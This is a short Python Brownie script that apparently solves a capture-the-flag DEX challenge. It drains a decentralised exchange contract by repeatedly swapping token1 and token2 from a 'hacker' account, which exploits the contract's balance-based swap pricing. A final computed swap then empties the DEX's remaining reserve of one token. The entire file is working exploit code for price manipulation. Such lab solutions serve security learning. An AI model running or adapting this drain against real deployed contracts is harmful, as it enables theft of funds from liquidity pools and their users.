from brownie import accounts, interface

def main(target):
    owner = accounts[0]
    hacker = accounts[1]
    dex = interface.IDex(target)
    token1 = interface.IERC20(dex.token1())
    token2 = interface.IERC20(dex.token2())
    tokenFrom = token1
    tokenTo = token2
    price = dex.get_swap_price(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker))
    while price <= tokenTo.balanceOf(dex):
        dex.swap(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker), {'from': hacker})
        print(f'Token1: {token1.balanceOf(hacker)} - Token2: {token2.balanceOf(hacker)}')
        tmp = tokenTo
        tokenTo = tokenFrom
        tokenFrom = tmp
        price = dex.get_swap_price(tokenFrom, tokenTo, tokenFrom.balanceOf(hacker))
    print('We need to finalize last part')
    amount = int(tokenFrom.balanceOf(hacker) * tokenTo.balanceOf(dex) / price)
    print(f'Amount: {amount}')
    price = dex.get_swap_price(tokenFrom, tokenTo, amount)
    print(f'Price: {price} - Balance: {tokenTo.balanceOf(dex)}')
    dex.swap(tokenFrom, tokenTo, amount, {'from': hacker})
    print(f'Dex Token1: {token1.balanceOf(dex)} - Dex Token2: {token2.balanceOf(dex)}')